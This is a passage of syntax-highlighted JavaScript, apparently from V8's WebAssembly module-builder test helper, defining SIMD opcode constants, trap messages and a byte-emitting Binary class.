<span class="hljs-keyword">let</span> kExprI32x4Mul = <span class="hljs-number">0xb5</span>;
<span class="hljs-keyword">let</span> kExprI32x4MinS = <span class="hljs-number">0xb6</span>;
<span class="hljs-keyword">let</span> kExprI32x4MinU = <span class="hljs-number">0xb7</span>;
<span class="hljs-keyword">let</span> kExprI32x4MaxS = <span class="hljs-number">0xb8</span>;
<span class="hljs-keyword">let</span> kExprI32x4MaxU = <span class="hljs-number">0xb9</span>;
<span class="hljs-keyword">let</span> kExprI32x4DotI16x8S = <span class="hljs-number">0xba</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulLowI16x8S = <span class="hljs-number">0xbc</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulHighI16x8S = <span class="hljs-number">0xbd</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulLowI16x8U = <span class="hljs-number">0xbe</span>;
<span class="hljs-keyword">let</span> kExprI32x4ExtMulHighI16x8U = <span class="hljs-number">0xbf</span>;
<span class="hljs-keyword">let</span> kExprI64x2Abs = <span class="hljs-number">0xc0</span>;
<span class="hljs-keyword">let</span> kExprI64x2Neg = <span class="hljs-number">0xc1</span>;
<span class="hljs-keyword">let</span> kExprI64x2AllTrue = <span class="hljs-number">0xc3</span>;
<span class="hljs-keyword">let</span> kExprI64x2BitMask = <span class="hljs-number">0xc4</span>;
<span class="hljs-keyword">let</span> kExprI64x2SConvertI32x4Low = <span class="hljs-number">0xc7</span>;
<span class="hljs-keyword">let</span> kExprI64x2SConvertI32x4High = <span class="hljs-number">0xc8</span>;
<span class="hljs-keyword">let</span> kExprI64x2UConvertI32x4Low = <span class="hljs-number">0xc9</span>;
<span class="hljs-keyword">let</span> kExprI64x2UConvertI32x4High = <span class="hljs-number">0xca</span>;
<span class="hljs-keyword">let</span> kExprI64x2Shl = <span class="hljs-number">0xcb</span>;
<span class="hljs-keyword">let</span> kExprI64x2ShrS = <span class="hljs-number">0xcc</span>;
<span class="hljs-keyword">let</span> kExprI64x2ShrU = <span class="hljs-number">0xcd</span>;
<span class="hljs-keyword">let</span> kExprI64x2Add = <span class="hljs-number">0xce</span>;
<span class="hljs-keyword">let</span> kExprI64x2Sub = <span class="hljs-number">0xd1</span>;
<span class="hljs-keyword">let</span> kExprI64x2Mul = <span class="hljs-number">0xd5</span>;
<span class="hljs-keyword">let</span> kExprI64x2Eq = <span class="hljs-number">0xd6</span>;
<span class="hljs-keyword">let</span> kExprI64x2Ne = <span class="hljs-number">0xd7</span>;
<span class="hljs-keyword">let</span> kExprI64x2LtS = <span class="hljs-number">0xd8</span>;
<span class="hljs-keyword">let</span> kExprI64x2GtS = <span class="hljs-number">0xd9</span>;
<span class="hljs-keyword">let</span> kExprI64x2LeS = <span class="hljs-number">0xda</span>;
<span class="hljs-keyword">let</span> kExprI64x2GeS = <span class="hljs-number">0xdb</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulLowI32x4S = <span class="hljs-number">0xdc</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulHighI32x4S = <span class="hljs-number">0xdd</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulLowI32x4U = <span class="hljs-number">0xde</span>;
<span class="hljs-keyword">let</span> kExprI64x2ExtMulHighI32x4U = <span class="hljs-number">0xdf</span>;
<span class="hljs-keyword">let</span> kExprF32x4Abs = <span class="hljs-number">0xe0</span>;
<span class="hljs-keyword">let</span> kExprF32x4Neg = <span class="hljs-number">0xe1</span>;
<span class="hljs-keyword">let</span> kExprF32x4Sqrt = <span class="hljs-number">0xe3</span>;
<span class="hljs-keyword">let</span> kExprF32x4Add = <span class="hljs-number">0xe4</span>;
<span class="hljs-keyword">let</span> kExprF32x4Sub = <span class="hljs-number">0xe5</span>;
<span class="hljs-keyword">let</span> kExprF32x4Mul = <span class="hljs-number">0xe6</span>;
<span class="hljs-keyword">let</span> kExprF32x4Div = <span class="hljs-number">0xe7</span>;
<span class="hljs-keyword">let</span> kExprF32x4Min = <span class="hljs-number">0xe8</span>;
<span class="hljs-keyword">let</span> kExprF32x4Max = <span class="hljs-number">0xe9</span>;
<span class="hljs-keyword">let</span> kExprF32x4Pmin = <span class="hljs-number">0xea</span>;
<span class="hljs-keyword">let</span> kExprF32x4Pmax = <span class="hljs-number">0xeb</span>;
<span class="hljs-keyword">let</span> kExprF64x2Abs = <span class="hljs-number">0xec</span>;
<span class="hljs-keyword">let</span> kExprF64x2Neg = <span class="hljs-number">0xed</span>;
<span class="hljs-keyword">let</span> kExprF64x2Sqrt = <span class="hljs-number">0xef</span>;
<span class="hljs-keyword">let</span> kExprF64x2Add = <span class="hljs-number">0xf0</span>;
<span class="hljs-keyword">let</span> kExprF64x2Sub = <span class="hljs-number">0xf1</span>;
<span class="hljs-keyword">let</span> kExprF64x2Mul = <span class="hljs-number">0xf2</span>;
<span class="hljs-keyword">let</span> kExprF64x2Div = <span class="hljs-number">0xf3</span>;
<span class="hljs-keyword">let</span> kExprF64x2Min = <span class="hljs-number">0xf4</span>;
<span class="hljs-keyword">let</span> kExprF64x2Max = <span class="hljs-number">0xf5</span>;
<span class="hljs-keyword">let</span> kExprF64x2Pmin = <span class="hljs-number">0xf6</span>;
<span class="hljs-keyword">let</span> kExprF64x2Pmax = <span class="hljs-number">0xf7</span>;
<span class="hljs-keyword">let</span> kExprI32x4SConvertF32x4 = <span class="hljs-number">0xf8</span>;
<span class="hljs-keyword">let</span> kExprI32x4UConvertF32x4 = <span class="hljs-number">0xf9</span>;
<span class="hljs-keyword">let</span> kExprF32x4SConvertI32x4 = <span class="hljs-number">0xfa</span>;
<span class="hljs-keyword">let</span> kExprF32x4UConvertI32x4 = <span class="hljs-number">0xfb</span>;
<span class="hljs-keyword">let</span> kExprI32x4TruncSatF64x2SZero = <span class="hljs-number">0xfc</span>;
<span class="hljs-keyword">let</span> kExprI32x4TruncSatF64x2UZero = <span class="hljs-number">0xfd</span>;
<span class="hljs-keyword">let</span> kExprF64x2ConvertLowI32x4S = <span class="hljs-number">0xfe</span>;
<span class="hljs-keyword">let</span> kExprF64x2ConvertLowI32x4U = <span class="hljs-number">0xff</span>;

<span class="hljs-comment">// Relaxed SIMD.</span>
<span class="hljs-keyword">let</span> kExprI8x16RelaxedSwizzle = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x100</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF32x4S = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x101</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF32x4U = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x102</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF64x2SZero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x103</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedTruncF64x2UZero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x104</span>);
<span class="hljs-keyword">let</span> kExprF32x4Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x105</span>);
<span class="hljs-keyword">let</span> kExprF32x4Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x106</span>);
<span class="hljs-keyword">let</span> kExprF64x2Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x107</span>);
<span class="hljs-keyword">let</span> kExprF64x2Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x108</span>);
<span class="hljs-keyword">let</span> kExprI8x16RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x109</span>);
<span class="hljs-keyword">let</span> kExprI16x8RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10a</span>);
<span class="hljs-keyword">let</span> kExprI32x4RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10b</span>);
<span class="hljs-keyword">let</span> kExprI64x2RelaxedLaneSelect = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10c</span>);
<span class="hljs-keyword">let</span> kExprF32x4RelaxedMin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10d</span>);
<span class="hljs-keyword">let</span> kExprF32x4RelaxedMax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10e</span>);
<span class="hljs-keyword">let</span> kExprF64x2RelaxedMin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x10f</span>);
<span class="hljs-keyword">let</span> kExprF64x2RelaxedMax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x110</span>);
<span class="hljs-keyword">let</span> kExprI16x8RelaxedQ15MulRS = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x111</span>);
<span class="hljs-keyword">let</span> kExprI16x8DotI8x16I7x16S = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x112</span>);
<span class="hljs-keyword">let</span> kExprI32x4DotI8x16I7x16AddS = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x113</span>);

<span class="hljs-comment">// FP16 SIMD</span>
<span class="hljs-keyword">let</span> kExprF16x8Splat = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x120</span>);
<span class="hljs-keyword">let</span> kExprF16x8ExtractLane = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x121</span>);
<span class="hljs-keyword">let</span> kExprF16x8ReplaceLane = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x122</span>);
<span class="hljs-keyword">let</span> kExprF16x8Abs = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x130</span>);
<span class="hljs-keyword">let</span> kExprF16x8Neg = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x131</span>);
<span class="hljs-keyword">let</span> kExprF16x8Sqrt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x132</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ceil = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x133</span>);
<span class="hljs-keyword">let</span> kExprF16x8Floor = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x134</span>);
<span class="hljs-keyword">let</span> kExprF16x8Trunc = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x135</span>);
<span class="hljs-keyword">let</span> kExprF16x8NearestInt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x136</span>);
<span class="hljs-keyword">let</span> kExprF16x8Eq = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x137</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ne = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x138</span>);
<span class="hljs-keyword">let</span> kExprF16x8Lt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x139</span>);
<span class="hljs-keyword">let</span> kExprF16x8Gt = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13a</span>);
<span class="hljs-keyword">let</span> kExprF16x8Le = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13b</span>);
<span class="hljs-keyword">let</span> kExprF16x8Ge = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13c</span>);
<span class="hljs-keyword">let</span> kExprF16x8Add = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13d</span>);
<span class="hljs-keyword">let</span> kExprF16x8Sub = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13e</span>);
<span class="hljs-keyword">let</span> kExprF16x8Mul = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x13f</span>);
<span class="hljs-keyword">let</span> kExprF16x8Div = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x140</span>);
<span class="hljs-keyword">let</span> kExprF16x8Min = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x141</span>);
<span class="hljs-keyword">let</span> kExprF16x8Max = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x142</span>);
<span class="hljs-keyword">let</span> kExprF16x8Pmin = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x143</span>);
<span class="hljs-keyword">let</span> kExprF16x8Pmax = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x144</span>);
<span class="hljs-keyword">let</span> kExprI16x8SConvertF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x145</span>);
<span class="hljs-keyword">let</span> kExprI16x8UConvertF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x146</span>);
<span class="hljs-keyword">let</span> kExprF16x8SConvertI16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x147</span>);
<span class="hljs-keyword">let</span> kExprF16x8UConvertI16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x148</span>);
<span class="hljs-keyword">let</span> kExprF16x8DemoteF32x4Zero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x149</span>);
<span class="hljs-keyword">let</span> kExprF16x8DemoteF64x2Zero = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14a</span>);
<span class="hljs-keyword">let</span> kExprF32x4PromoteLowF16x8 = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14b</span>);
<span class="hljs-keyword">let</span> kExprF16x8Qfma = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14e</span>);
<span class="hljs-keyword">let</span> kExprF16x8Qfms = <span class="hljs-title function_">wasmSignedLeb</span>(<span class="hljs-number">0x14f</span>);

<span class="hljs-keyword">let</span> kTrapUnreachable = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kTrapMemOutOfBounds = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kTrapDivByZero = <span class="hljs-number">2</span>;
<span class="hljs-keyword">let</span> kTrapDivUnrepresentable = <span class="hljs-number">3</span>;
<span class="hljs-keyword">let</span> kTrapRemByZero = <span class="hljs-number">4</span>;
<span class="hljs-keyword">let</span> kTrapFloatUnrepresentable = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> kTrapTableOutOfBounds = <span class="hljs-number">6</span>;
<span class="hljs-keyword">let</span> kTrapNullFunc = <span class="hljs-number">7</span>;
<span class="hljs-keyword">let</span> kTrapFuncSigMismatch = <span class="hljs-number">8</span>;
<span class="hljs-keyword">let</span> kTrapUnalignedAccess = <span class="hljs-number">9</span>;
<span class="hljs-keyword">let</span> kTrapDataSegmentOutOfBounds = <span class="hljs-number">10</span>;
<span class="hljs-keyword">let</span> kTrapElementSegmentOutOfBounds = <span class="hljs-number">11</span>;
<span class="hljs-keyword">let</span> kTrapRethrowNull = <span class="hljs-number">12</span>;
<span class="hljs-keyword">let</span> kTrapArrayTooLarge = <span class="hljs-number">13</span>;
<span class="hljs-keyword">let</span> kTrapArrayOutOfBounds = <span class="hljs-number">14</span>;
<span class="hljs-keyword">let</span> kTrapNullDereference = <span class="hljs-number">15</span>;
<span class="hljs-keyword">let</span> kTrapIllegalCast = <span class="hljs-number">16</span>;

<span class="hljs-keyword">let</span> kAtomicWaitOk = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> kAtomicWaitNotEqual = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> kAtomicWaitTimedOut = <span class="hljs-number">2</span>;

<span class="hljs-comment">// Exception handling with exnref.</span>
<span class="hljs-keyword">let</span> kCatchNoRef = <span class="hljs-number">0x0</span>;
<span class="hljs-keyword">let</span> kCatchRef = <span class="hljs-number">0x1</span>;
<span class="hljs-keyword">let</span> kCatchAllNoRef = <span class="hljs-number">0x2</span>;
<span class="hljs-keyword">let</span> kCatchAllRef = <span class="hljs-number">0x3</span>;

<span class="hljs-comment">// Stack switching handler kinds.</span>
<span class="hljs-keyword">let</span> kOnSuspend = <span class="hljs-number">0x0</span>;
<span class="hljs-keyword">let</span> kOnSwitch = <span class="hljs-number">0x1</span>;

<span class="hljs-keyword">let</span> kTrapMsgs = [
  <span class="hljs-string">&#x27;unreachable&#x27;</span>,                                    <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;memory access out of bounds&#x27;</span>,                    <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;divide by zero&#x27;</span>,                                 <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;divide result unrepresentable&#x27;</span>,                  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;remainder by zero&#x27;</span>,                              <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;float unrepresentable in integer range&#x27;</span>,         <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;table index is out of bounds&#x27;</span>,                   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;null function&#x27;</span>,   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;function signature mismatch&#x27;</span>,   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;operation does not support unaligned accesses&#x27;</span>,  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;data segment out of bounds&#x27;</span>,                     <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;element segment out of bounds&#x27;</span>,                  <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;rethrowing null value&#x27;</span>,                          <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;requested new array is too large&#x27;</span>,               <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;array element access out of bounds&#x27;</span>,             <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;dereferencing a null pointer&#x27;</span>,                   <span class="hljs-comment">// --</span>
  <span class="hljs-string">&#x27;illegal cast&#x27;</span>,                                   <span class="hljs-comment">// --</span>
];

<span class="hljs-comment">// This requires test/mjsunit/mjsunit.js.</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">assertTraps</span>(<span class="hljs-params">trap, code</span>) {
  <span class="hljs-title function_">assertThrows</span>(code, <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-property">RuntimeError</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(kTrapMsgs[trap]));
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">assertTrapsOneOf</span>(<span class="hljs-params">traps, code</span>) {
  <span class="hljs-keyword">const</span> errorChecker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(
    <span class="hljs-string">&#x27;(&#x27;</span> + traps.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">trap</span> =&gt;</span> kTrapMsgs[trap]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;|&#x27;</span>) + <span class="hljs-string">&#x27;)&#x27;</span>
  );
  <span class="hljs-title function_">assertThrows</span>(code, <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-property">RuntimeError</span>, errorChecker);
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Binary</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">8192</span>);
  }

  <span class="hljs-title function_">ensure_space</span>(<span class="hljs-params">needed</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">length</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> &gt;= needed) <span class="hljs-keyword">return</span>;
    <span class="hljs-keyword">let</span> new_capacity = <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">length</span> * <span class="hljs-number">2</span>;
    <span class="hljs-keyword">while</span> (new_capacity - <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> &lt; needed) new_capacity *= <span class="hljs-number">2</span>;
    <span class="hljs-keyword">let</span> new_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(new_capacity);
    new_buffer.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = new_buffer;
  }

  <span class="hljs-title function_">trunc_buffer</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-property">buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>);
  }

  <span class="hljs-title function_">reset</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
  }

  <span class="hljs-title function_">emit_u8</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">1</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
  }

  <span class="hljs-title function_">emit_u16</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">2</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">8</span>;
  }

  <span class="hljs-title function_">emit_u32</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(<span class="hljs-number">4</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">8</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">16</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = val &gt;&gt; <span class="hljs-number">24</span>;
  }

  <span class="hljs-title function_">emit_leb_u</span>(<span class="hljs-params">val, max_len</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(max_len);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; max_len; ++i) {
      <span class="hljs-keyword">let</span> v = val &amp; <span class="hljs-number">0xff</span>;
      val = val &gt;&gt;&gt; <span class="hljs-number">7</span>;
      <span class="hljs-keyword">if</span> (val == <span class="hljs-number">0</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = v;
        <span class="hljs-keyword">return</span>;
      }
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>++] = v | <span class="hljs-number">0x80</span>;
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Leb value exceeds maximum length of &#x27;</span> + max_len);
  }

  <span class="hljs-title function_">emit_u32v</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_leb_u</span>(val, kMaxVarInt32Size);
  }

  <span class="hljs-title function_">emit_u64v</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_leb_u</span>(val, kMaxVarInt64Size);
  }

  <span class="hljs-title function_">emit_bytes</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensure_space</span>(data.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>.<span class="hljs-title function_">set</span>(data, <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> += data.<span class="hljs-property">length</span>;
  }

  <span class="hljs-title function_">emit_string</span>(<span class="hljs-params">string</span>) {
    <span class="hljs-comment">// When testing illegal names, we pass a byte array directly.</span>
    <span class="hljs-keyword">if</span> (string <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(string.<span class="hljs-property">length</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(string);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// This is the hacky way to convert a JavaScript string to a UTF8 encoded</span>
    <span class="hljs-comment">// string only containing single-byte characters.</span>
    <span class="hljs-keyword">let</span> string_utf8 = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">encodeURIComponent</span>(string));
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(string_utf8.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; string_utf8.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(string_utf8.<span class="hljs-title function_">charCodeAt</span>(i));
    }
  }

  <span class="hljs-title function_">emit_heap_type</span>(<span class="hljs-params">heap_type</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(<span class="hljs-title function_">wasmSignedLeb</span>(heap_type, kMaxVarInt32Size));
  }

  <span class="hljs-title function_">emit_type</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(type &gt;= <span class="hljs-number">0</span> ? type : type &amp; kLeb128Mask);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">opcode</span>);
      <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_shared</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kWasmSharedTypeForm);
      <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_exact</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kWasmExact);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_heap_type</span>(type.<span class="hljs-property">heap_type</span>);
    }
  }

  <span class="hljs-title function_">emit_init_expr</span>(<span class="hljs-params">expr</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(expr);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(kExprEnd);
  }

  <span class="hljs-title function_">emit_header</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>([
      kWasmH0, kWasmH1, kWasmH2, kWasmH3, kWasmV0, kWasmV1, kWasmV2, kWasmV3
    ]);
  }

  <span class="hljs-title function_">emit_section</span>(<span class="hljs-params">section_code, content_generator</span>) {
    <span class="hljs-comment">// Emit section name.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u8</span>(section_code);
    <span class="hljs-comment">// Emit the section to a temporary buffer: its full length isn&#x27;t know yet.</span>
    <span class="hljs-keyword">const</span> section = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
    <span class="hljs-title function_">content_generator</span>(section);
    <span class="hljs-comment">// Emit section length.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_u32v</span>(section.<span class="hljs-property">length</span>);
    <span class="hljs-comment">// Copy the temporary buffer.</span>
    <span class="hljs-comment">// Avoid spread because {section} can be huge.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">emit_bytes</span>(section.<span class="hljs-title function_">trunc_buffer</span>());
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmFunctionBuilder</span> {
  <span class="hljs-comment">// Encoding of local names: a string corresponds to a local name,</span>
  <span class="hljs-comment">// a number n corresponds to n undefined names.</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type_index, arg_names</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_index</span> = type_index;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = [];
